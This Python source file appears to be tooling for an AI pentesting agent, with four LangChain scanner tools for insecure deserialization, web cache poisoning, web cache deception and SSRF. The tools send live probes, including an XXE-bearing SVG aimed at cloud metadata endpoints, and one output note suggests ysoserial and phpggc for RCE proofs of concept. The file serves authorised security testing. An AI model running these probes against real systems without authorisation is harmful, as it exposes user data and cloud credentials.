import json
import requests
import re
import base64
import urllib3
from urllib.parse import quote, urlparse
from langchain.tools import tool
from core.rate_limiter import rate_limiter
from core.cancellation import check_cancelled
from core.checkpoint import require_approval
from core.auth_store import get_auth_kwargs
from engines.oob_engine import oob_engine

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def _domain_of(url: str) -> str:
    try:
        return urlparse(url).netloc.split(":")[0].lower()
    except Exception:
        return url

def _logger():
    from tools.custom_tools import exec_logger
    return exec_logger


# ==========================================
# TOOL 1: Insecure Deserialization Scanner
# ==========================================
@tool("insecure_deserialization_scanner")
def insecure_deserialization_scanner(url: str, cookies: str = "", headers_json: str = "") -> str:
    """
    Scan untuk Insecure Deserialization vulnerability.
    Deteksi serialized object signatures di:
    - PHP: O:8: / a:2: patterns
    - Java: rO0AB (base64 of 0xACED magic bytes)
    - Python: 0x80 0x04 (pickle magic) / gASV (base64 pickle)
    - Ruby: BAh (base64 Marshal)
    - .NET: AAEAAAD (base64 BinaryFormatter)
    Juga test response behavior ketika serialized objects di-inject.
    url: target URL
    cookies: optional cookies string
    headers_json: optional extra headers JSON
    """
    tool_name = "Insecure Deserialization Scanner"
    logger = _logger()
    logger.add_log(tool_name, "START", f"Starting deserialization scan pada {url}")
    if check_cancelled(logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."

    approved = require_approval(
        action=f"Insecure deserialization scan pada {url}",
        context="Sending serialized object payloads dan menganalisis response",
        risk="medium",
        exec_logger=logger,
    )
    if not approved:
        logger.add_log(tool_name, "BLOCKED", "Cancelled: approval rejected")
        return "SCAN DIBATALKAN: human-in-the-loop approval rejected atau timeout."

    domain = _domain_of(url)
    auth_kwargs = get_auth_kwargs(domain)
    extra_headers = {}
    if headers_json:
        try:
            extra_headers = json.loads(headers_json)
        except Exception:
            pass
    cookie_dict = {}
    if cookies:
        for part in cookies.split(";"):
            if "=" in part:
                k, v = part.strip().split("=", 1)
                cookie_dict[k.strip()] = v.strip()

    findings = {
        "serialized_objects_detected": [],
        "vulnerable_endpoints": [],
        "gadget_chain_hints": []
    }

    # ── 1. Detect serialized objects in existing responses ─────────────────────
    logger.add_log(tool_name, "PROCESSING", "Scanning responses for serialized object signatures")

    # Signatures buat detect serialized objects
    signatures = {
        "PHP Object":       [b"O:", b"a:", b"s:", b"i:"],
        "Java Serialized":  [b"\xac\xed\x00\x05", b"rO0AB"],  # magic bytes + base64
        "Python Pickle":    [b"\x80\x04\x95", b"\x80\x03}", b"gASV"],
        "Ruby Marshal":     [b"\x04\x08", b"BAh"],
        ".NET BinaryFormatter": [b"\x00\x01\x00\x00\x00", b"AAEAAAD"],
    }

    # Check cookies and response body for serialized objects
    try:
        rate_limiter.wait(domain)
        r = requests.get(url, headers=extra_headers, cookies=cookie_dict, timeout=8, verify=False)

        # Check response body
        for lang, sigs in signatures.items():
            for sig in sigs:
                if isinstance(sig, bytes):
                    if sig in r.content:
                        findings["serialized_objects_detected"].append({
                            "location": "Response Body",
                            "type": lang,
                            "signature": sig.hex() if not sig.isascii() else sig.decode(),
                            "severity": "High",
                            "note": "Serialized object found in response — possible deserialization endpoint"
                        })
                        logger.add_log(tool_name, "WARNING", f"Serialized object in body: {lang}")
                        break
                elif isinstance(sig, str):
                    if sig in r.text:
                        findings["serialized_objects_detected"].append({
                            "location": "Response Body",
                            "type": lang,
                            "signature": sig,
                            "severity": "High"
                        })
                        break

        # Check Set-Cookie headers for serialized objects
        for cookie_name, cookie_val in r.cookies.items():
            try:
                decoded = base64.b64decode(cookie_val + "==")
                for lang, sigs in signatures.items():
                    for sig in sigs:
                        if isinstance(sig, bytes) and sig in decoded:
                            findings["serialized_objects_detected"].append({
                                "location": f"Cookie: {cookie_name}",
                                "type": lang,
                                "cookie_value_preview": cookie_val[:50],
                                "severity": "Critical",
                                "note": "Serialized object in cookie — HIGH risk deserialization"
                            })
                            logger.add_log(tool_name, "WARNING", f"Serialized object in cookie '{cookie_name}': {lang}")
            except Exception:
                # Not base64 — still check raw
                for lang, sigs in signatures.items():
                    for sig in sigs:
                        if isinstance(sig, str) and sig in cookie_val:
                            findings["serialized_objects_detected"].append({
                                "location": f"Cookie: {cookie_name}",
                                "type": lang,
                                "severity": "Critical"
                            })

    except Exception as e:
        logger.add_log(tool_name, "WARNING", f"Response analysis error: {e}")

    # ── 2. Test injection of malformed serialized objects ─────────────────────
    logger.add_log(tool_name, "PROCESSING", "Testing serialized object injection")

    # Malformed/probe payloads buat detect deserialization without triggering RCE
    probe_payloads = {
        "PHP": [
            'O:8:"stdClass":0:{}',
            'a:1:{s:4:"test";s:4:"test";}',
            'O:1:"A":1:{s:1:"a";i:1;}',
        ],
        "Java": [
            base64.b64encode(b"\xac\xed\x00\x05" + b"t\x00\x04test").decode(),  # short string
        ],
        "Python Pickle": [
            base64.b64encode(b"\x80\x04\x95\x00\x00\x00\x00\x00\x00\x00\x00.").decode(),  # empty pickle
        ],
    }

    # Common injection points
    injection_params = ["data", "token", "session", "object", "payload", "serialized", "state"]

    for lang, payloads in probe_payloads.items():
        for payload in payloads:
            for param in injection_params[:4]:
                if check_cancelled(logger): break
                try:
                    rate_limiter.wait(domain)
                    # Test GET
                    r = requests.get(
                        f"{url}?{param}={quote(payload)}",
                        headers=extra_headers, cookies=cookie_dict,
                        timeout=5, verify=False
                    )
                    # Indicators of deserialization processing:
                    # 1. 500 error (deserialization exception)
                    # 2. Different response than normal
                    # 3. Error messages mentioning class/object/deserialize
                    deser_errors = [
                        "unserialize", "deserialize", "ClassNotFound",
                        "java.io.InvalidClassException", "pickle",
                        "Marshal", "ObjectInputStream", "Serializable",
                        "phpggc", "ysoserial"
                    ]
                    if r.status_code == 500 or any(e in r.text for e in deser_errors):
                        findings["vulnerable_endpoints"].append({
                            "parameter": param,
                            "payload_type": lang,
                            "status": r.status_code,
                            "type": "Possible Insecure Deserialization",
                            "evidence": next((e for e in deser_errors if e in r.text), f"HTTP {r.status_code}"),
                            "severity": "Critical"
                        })
                        logger.add_log(tool_name, "WARNING",
                            f"Deserialization indicator: param={param}, lang={lang}, status={r.status_code}")
                        break
                except Exception:
                    pass

    # ── 3. Check for known deserialization libraries in JS/headers ─────────────
    logger.add_log(tool_name, "PROCESSING", "Checking for deserialization library hints")
    try:
        rate_limiter.wait(domain)
        r = requests.get(url, timeout=5, verify=False)
        gadget_hints = {
            "Commons Collections": "commons-collections",
            "Spring Framework": ["spring", "springframework"],
            "Apache Struts": "struts",
            "JBoss": "jboss",
            "WebLogic": "weblogic",
            "Jenkins": "jenkins",
        }
        body_lower = r.text.lower()
        headers_str = str(dict(r.headers)).lower()
        for gadget, hints in gadget_hints.items():
            hints = [hints] if isinstance(hints, str) else hints
            if any(h in body_lower or h in headers_str for h in hints):
                findings["gadget_chain_hints"].append({
                    "library": gadget,
                    "note": f"{gadget} detected — known gadget chains exist for this library",
                    "severity": "High"
                })
                logger.add_log(tool_name, "WARNING", f"Gadget chain hint: {gadget}")
    except Exception:
        pass

    total = len(findings["serialized_objects_detected"]) + len(findings["vulnerable_endpoints"])
    result = {
        "status": "VULNERABLE" if total > 0 else "SAFE",
        "findings": findings,
        "note": "Use ysoserial (Java) / phpggc (PHP) / pickle-tools (Python) for RCE PoC after confirming vulnerability"
    }
    logger.add_log(tool_name, "SUCCESS", f"Deserialization scan complete. Issues: {total}")
    return json.dumps(result, indent=2)


# ==========================================
# TOOL 2: Web Cache Poisoning Scanner
# ==========================================
@tool("web_cache_poisoning_scanner")
def web_cache_poisoning_scanner(url: str) -> str:
    """
    Scan untuk Web Cache Poisoning vulnerability.
    Test unkeyed headers yang bisa poison cache:
    - X-Forwarded-Host, X-Forwarded-Scheme, X-Original-URL
    - X-Forwarded-For, X-Real-IP
    - Fat GET (request body in GET)
    - Parameter cloaking
    url: target URL (sebaiknya pake URL yang kemungkinan di-cache: CSS, JS, atau page statis)
    """
    tool_name = "Web Cache Poisoning Scanner"
    logger = _logger()
    logger.add_log(tool_name, "START", f"Starting cache poisoning scan pada {url}")
    if check_cancelled(logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."

    domain = _domain_of(url)
    auth_kwargs = get_auth_kwargs(domain)
    findings = {"vulnerabilities": [], "cache_behavior": {}, "unkeyed_headers": []}

    # ── 1. Detect if response is cached ──────────────────────────────────────
    logger.add_log(tool_name, "PROCESSING", "Detecting cache behavior")
    try:
        rate_limiter.wait(domain)
        r1 = requests.get(url, timeout=5, verify=False)
        rate_limiter.wait(domain)
        r2 = requests.get(url, timeout=5, verify=False)

        cache_headers = {
            "Cache-Control": r1.headers.get("Cache-Control", "MISSING"),
            "Age": r1.headers.get("Age", "MISSING"),
            "X-Cache": r1.headers.get("X-Cache", "MISSING"),
            "X-Cache-Hit": r1.headers.get("X-Cache-Hit", "MISSING"),
            "CF-Cache-Status": r1.headers.get("CF-Cache-Status", "MISSING"),
            "Vary": r1.headers.get("Vary", "MISSING"),
        }
        findings["cache_behavior"] = cache_headers

        is_cached = any([
            "HIT" in str(r2.headers.get("X-Cache", "")),
            "HIT" in str(r2.headers.get("CF-Cache-Status", "")),
            r2.headers.get("Age", "0") != "0",
            "public" in str(r1.headers.get("Cache-Control", "")),
        ])
        findings["cache_behavior"]["is_cached"] = is_cached

        if not is_cached:
            logger.add_log(tool_name, "WARNING", "Response doesn't appear to be cached — cache poisoning unlikely but continuing")

    except Exception as e:
        logger.add_log(tool_name, "WARNING", f"Cache detection error: {e}")

    # ── 2. Test unkeyed headers ───────────────────────────────────────────────
    logger.add_log(tool_name, "PROCESSING", "Testing unkeyed header reflection")
    canary = "nexus-cache-test-7734"

    unkeyed_headers_to_test = [
        {"X-Forwarded-Host": f"{canary}.com"},
        {"X-Forwarded-Scheme": "nothttps"},
        {"X-Original-URL": f"/{canary}"},
        {"X-Rewrite-URL": f"/{canary}"},
        {"X-Forwarded-Prefix": f"/{canary}"},
        {"X-Host": f"{canary}.com"},
        {"X-Forwarded-Server": f"{canary}.com"},
        {"X-HTTP-Host-Override": f"{canary}.com"},
        {"Forwarded": f"host={canary}.com"},
    ]

    for attack_header in unkeyed_headers_to_test:
        if check_cancelled(logger): break
        try:
            rate_limiter.wait(domain)
            r = requests.get(url, headers=attack_header, timeout=5, verify=False)

            header_name = list(attack_header.keys())[0]
            header_val = list(attack_header.values())[0]

            # Check if canary appears in response (reflected = unkeyed = poisonable)
            if canary in r.text:
                findings["unkeyed_headers"].append({
                    "header": header_name,
                    "value": header_val,
                    "reflected": True,
                    "severity": "High"
                })
                findings["vulnerabilities"].append({
                    "type": "Web Cache Poisoning",
                    "unkeyed_header": header_name,
                    "evidence": f"Header value '{canary}' reflected in response body",
                    "impact": "Inject malicious content into cached response served to other users",
                    "severity": "High"
                })
                logger.add_log(tool_name, "WARNING", f"Unkeyed header found: {header_name}")
            else:
                findings["unkeyed_headers"].append({
                    "header": header_name,
                    "reflected": False
                })
        except Exception:
            pass

    # ── 3. Fat GET / Parameter Cloaking ──────────────────────────────────────
    logger.add_log(tool_name, "PROCESSING", "Testing Fat GET and parameter cloaking")
    try:
        rate_limiter.wait(domain)
        # Fat GET: GET request with body
        r = requests.get(
            url,
            data=f"utm_content={canary}",
            headers={"Content-Type": "application/x-www-form-urlencoded"},
            timeout=5, verify=False
        )
        if canary in r.text:
            findings["vulnerabilities"].append({
                "type": "Web Cache Poisoning (Fat GET / Parameter Cloaking)",
                "evidence": "GET body parameter reflected in response",
                "severity": "High"
            })
            logger.add_log(tool_name, "WARNING", "Fat GET parameter cloaking detected!")
    except Exception:
        pass

    result = {
        "status": "VULNERABLE" if findings["vulnerabilities"] else "SAFE",
        "findings": findings,
        "note": "Cache poisoning needs multiple requests to confirm — reflected != always cached. Verify with Burp Cache Poisoning plugin."
    }
    logger.add_log(tool_name, "SUCCESS", f"Cache poisoning scan complete. Found: {len(findings['vulnerabilities'])}")
    return json.dumps(result, indent=2)


# ==========================================
# TOOL 3: Cache Deception Scanner
# ==========================================
@tool("cache_deception_scanner")
def cache_deception_scanner(url: str, auth_cookies: str = "") -> str:
    """
    Scan untuk Web Cache Deception vulnerability.
    Attack: /profile/nonexistent.css → CDN cache halaman profile dengan data sensitif
    Teknik: append fake static extension ke URL dinamis/authenticated.
    url: target base URL
    auth_cookies: cookies untuk authenticated session (e.g., "session=abc123")
    """
    tool_name = "Cache Deception Scanner"
    logger = _logger()
    logger.add_log(tool_name, "START", f"Starting cache deception scan pada {url}")
    if check_cancelled(logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."

    domain = _domain_of(url)
    auth_kwargs = get_auth_kwargs(domain)
    base = url.rstrip("/")

    cookie_dict = {}
    if auth_cookies:
        for part in auth_cookies.split(";"):
            if "=" in part:
                k, v = part.strip().split("=", 1)
                cookie_dict[k.strip()] = v.strip()

    findings = {"vulnerabilities": [], "suspicious": [], "tested_paths": []}

    # Sensitive paths yang mungkin ada data personal
    sensitive_paths = [
        "/profile", "/account", "/dashboard", "/settings",
        "/api/user", "/api/me", "/user/profile", "/my-account",
        "/orders", "/payment", "/billing", "/admin",
    ]

    # Static extensions yang sering di-cache CDN
    static_extensions = [".css", ".js", ".png", ".jpg", ".ico", ".svg", ".woff", ".gif"]

    logger.add_log(tool_name, "PROCESSING", "Testing cache deception paths")
    for path in sensitive_paths:
        if check_cancelled(logger): break
        for ext in static_extensions[:4]:  # limit iterations
            deception_url = f"{base}{path}/nexus_test{ext}"
            findings["tested_paths"].append(deception_url)
            try:
                # Request 1: authenticated
                rate_limiter.wait(domain)
                r_auth = requests.get(
                    deception_url,
                    cookies=cookie_dict,
                    timeout=5, verify=False
                )

                if r_auth.status_code == 200:
                    # Check if response contains sensitive data
                    sensitive_indicators = [
                        "email", "username", "phone", "address", "credit",
                        "token", "api_key", "password", "ssn", "dob",
                        "account_number", "balance"
                    ]
                    has_sensitive = any(si in r_auth.text.lower() for si in sensitive_indicators)
                    cache_headers = r_auth.headers.get("Cache-Control", "")
                    is_cached_response = any(kw in cache_headers for kw in ["public", "max-age"]) or \
                                        r_auth.headers.get("Age") is not None

                    if has_sensitive:
                        # Request 2: unauthenticated — check if cached data is served
                        rate_limiter.wait(domain)
                        r_unauth = requests.get(deception_url, timeout=5, verify=False)

                        if r_unauth.status_code == 200 and any(si in r_unauth.text.lower() for si in sensitive_indicators):
                            findings["vulnerabilities"].append({
                                "type": "Web Cache Deception",
                                "deception_url": deception_url,
                                "evidence": "Sensitive data accessible without auth via cached deception URL",
                                "severity": "Critical"
                            })
                            logger.add_log(tool_name, "WARNING", f"Cache deception confirmed: {deception_url}")
                        elif is_cached_response and has_sensitive:
                            findings["suspicious"].append({
                                "url": deception_url,
                                "note": "Authenticated response with sensitive data is cached — unauthenticated access not confirmed but risk exists",
                                "cache_control": cache_headers,
                                "severity": "High"
                            })
                            logger.add_log(tool_name, "WARNING", f"Suspicious cache deception: {deception_url}")

            except Exception:
                pass

    result = {
        "status": "VULNERABLE" if findings["vulnerabilities"] else (
            "SUSPICIOUS" if findings["suspicious"] else "SAFE"
        ),
        "findings": findings,
        "note": "Provide auth_cookies for comprehensive testing. Without auth, only basic path probing is done."
    }
    logger.add_log(tool_name, "SUCCESS", f"Cache deception scan complete. Vuln: {len(findings['vulnerabilities'])}")
    return json.dumps(result, indent=2)


# ==========================================
# TOOL 4: SSRF via File Upload & PDF Generator
# ==========================================
@tool("ssrf_advanced_scanner")
def ssrf_advanced_scanner(url: str, upload_param: str = "file") -> str:
    """
    Scan untuk SSRF melalui vector yang sering terlewat:
    1. SSRF via File Upload (SVG/XML dengan external entity/URL)
    2. SSRF via PDF/HTML generator (inject URL ke field yang generate PDF)
    3. SSRF via image URL parameter (avatar URL, import URL, webhook URL)
    url: target base URL atau specific endpoint
    upload_param: nama file input parameter (default: "file")
    """
    tool_name = "SSRF Advanced Scanner"
    logger = _logger()
    logger.add_log(tool_name, "START", f"Starting advanced SSRF scan pada {url}")
    if check_cancelled(logger): return "EKSEKUSI DIBATALKAN: job di-cancel oleh user."

    approved = require_approval(
        action=f"Advanced SSRF scan pada {url}",
        context="Upload SVG/XML files dengan SSRF payloads dan test URL parameters",
        risk="medium",
        exec_logger=logger,
    )
    if not approved:
        logger.add_log(tool_name, "BLOCKED", "Cancelled: approval rejected")
        return "SCAN DIBATALKAN: human-in-the-loop approval rejected atau timeout."

    domain = _domain_of(url)
    auth_kwargs = get_auth_kwargs(domain)
    base = url.rstrip("/")
    findings = {"vulnerabilities": [], "suspicious": []}

    # Internal IP addresses buat SSRF probe
    internal_targets = [
        "http://169.254.169.254/latest/meta-data/",          # AWS metadata
        "http://metadata.google.internal/computeMetadata/v1/", # GCP metadata
        "http://169.254.169.254/metadata/instance",           # Azure metadata
        "http://127.0.0.1/",                                  # localhost
        "http://localhost/",                                  # localhost alias
        "http://0.0.0.0/",                                   # null address
        "http://[::1]/",                                      # IPv6 localhost
        "http://192.168.1.1/",                               # common router
    ]

    # ── 1. SSRF via SVG file upload ───────────────────────────────────────────
    logger.add_log(tool_name, "PROCESSING", "Testing SSRF via SVG file upload")
    for internal_url in internal_targets[:4]:
        if check_cancelled(logger): break
        svg_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "{internal_url}">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text>&xxe;</text>
  <image href="{internal_url}" width="100" height="100"/>
</svg>""".encode()

        try:
            rate_limiter.wait(domain)
            files = {upload_param: ("payload.svg", svg_content, "image/svg+xml")}
            r = requests.post(url, files=files, timeout=8, verify=False)

            # SSRF indicators
            if r.status_code == 200:
                cloud_indicators = [
                    "ami-id", "instance-id", "hostname", "local-ipv4",
                    "computeMetadata", "project-id", "service-accounts",
                    "subscriptionId", "resourceGroupName"
                ]
                if any(ci in r.text for ci in cloud_indicators):
                    findings["vulnerabilities"].append({
                        "type": "SSRF via SVG File Upload (Cloud Metadata)",
                        "payload_url": internal_url,
                        "evidence": r.text[:300],
                        "severity": "Critical"
                    })
                    logger.add_log(tool_name, "WARNING", f"SSRF via SVG: cloud metadata exposed! URL={internal_url}")
                elif any(kw in r.text.lower() for kw in ["root:", "localhost", "127.0.0.1"]):
                    findings["suspicious"].append({
                        "type": "Possible SSRF via SVG Upload",
                        "payload_url": internal_url,
                        "note": "Internal content hints in response"
                    })
        except Exception:
            pass

    # ── 2. SSRF via PDF/HTML generator ───────────────────────────────────────
    logger.add_log(tool_name, "PROCESSING", "Testing SSRF via PDF/HTML generator endpoints")
    pdf_endpoints = [
        "/api/pdf", "/pdf", "/generate/pdf", "/export/pdf",
        "/api/export", "/print", "/screenshot", "/render",
        "/api/render", "/preview", "/api/preview",
        "/convert", "/api/convert", "/html2pdf",
    ]

    # Params yang sering dipakai buat specify URL di PDF generators
    url_params = ["url", "link", "src", "source", "target", "html", "page", "uri"]

    for ep in pdf_endpoints[:6]:
        if check_cancelled(logger): break
        try:
            rate_limiter.wait(domain)
            r = requests.get(f"{base}{ep}", timeout=4, verify=False)
            if r.status_code in [200, 405]:  # endpoint exists
                for param in url_params[:4]:
                    for internal_url in internal_targets[:3]:
                        try:
                            rate_limiter.wait(domain)
                            test_r = requests.get(
                                f"{base}{ep}?{param}={quote(internal_url)}",
                                timeout=8, verify=False
                            )
                            cloud_indicators = ["ami-id", "instance-id", "computeMetadata", "subscriptionId"]
                            if test_r.status_code == 200 and any(ci in test_r.text for ci in cloud_indicators):
                                findings["vulnerabilities"].append({
                                    "type": "SSRF via PDF/HTML Generator",
                                    "endpoint": f"{base}{ep}",
                                    "parameter": param,
                                    "payload_url": internal_url,
                                    "severity": "Critical"
                                })
                                logger.add_log(tool_name, "WARNING",
                                    f"SSRF via PDF generator: {ep}?{param}={internal_url}")
                        except Exception:
                            pass
        except Exception:
            pass

    # ── 3. SSRF via URL parameters ────────────────────────────────────────────
    logger.add_log(tool_name, "PROCESSING", "Testing SSRF via common URL parameters")
    url_param_names = [
        "url", "uri", "link", "src", "source", "target", "redirect",
        "callback", "return", "next", "goto", "dest", "destination",
        "image_url", "avatar_url", "profile_url", "webhook", "endpoint",
        "fetch", "load", "import", "include", "proxy",
    ]

    for param in url_param_names:
        if check_cancelled(logger): break
        for internal_url in internal_targets[:2]:
            try:
                rate_limiter.wait(domain)
                r = requests.get(
                    f"{base}?{param}={quote(internal_url)}",
                    timeout=6, verify=False
                )
                cloud_indicators = [
                    "ami-id", "instance-id", "computeMetadata",
                    "169.254.169.254", "local-ipv4", "hostname"
                ]
                if r.status_code == 200 and any(ci in r.text for ci in cloud_indicators):
                    findings["vulnerabilities"].append({
                        "type": "SSRF via URL Parameter",
                        "parameter": param,
                        "payload": internal_url,
                        "evidence": r.text[:200],
                        "severity": "Critical"
                    })
                    logger.add_log(tool_name, "WARNING", f"SSRF via param {param}: cloud metadata leaked!")
                    break
            except Exception:
                pass

    result = {
        "status": "VULNERABLE" if findings["vulnerabilities"] else (
            "SUSPICIOUS" if findings["suspicious"] else "SAFE"
        ),
        "findings": findings,
    }

    # ── OOB Blind SSRF Test ───────────────────────────────────────────────────
    if not check_cancelled(logger):
        logger.add_log(tool_name, "PROCESSING", "Phase 4: OOB Blind SSRF (interactsh)")
        try:
            oob_result = oob_engine.test_blind_ssrf(
                url=url,
                params=",".join(url_param_names[:15]),
                exec_logger=logger,
            )

            if oob_result.get("found"):
                findings["vulnerabilities"].append({
                    "type": "Blind SSRF (OOB Confirmed)",
                    "severity": "Critical",
                    "correlation_id": oob_result["correlation_id"],
                    "callback_url": oob_result["callback_url"],
                    "evidence": f"OOB interaction detected via {oob_result.get('interactions', [{}])[0].get('protocol', 'unknown')} protocol",
                    "interaction_count": oob_result.get("interaction_count", 0),
                    "poc_details": oob_result.get("poc_details", {}),
                })
                result["status"] = "VULNERABLE"

            result["oob_test"] = {
                "status": oob_result.get("status"),
                "correlation_id": oob_result.get("correlation_id"),
                "callback_url": oob_result.get("callback_url"),
                "poll_duration": oob_result.get("poll_duration"),
            }
        except Exception as e:
            logger.add_log(tool_name, "WARNING", f"OOB SSRF test error: {str(e)[:100]}")

    logger.add_log(tool_name, "SUCCESS", f"Advanced SSRF scan complete. Vuln: {len(findings['vulnerabilities'])}")
    return json.dumps(result, indent=2)
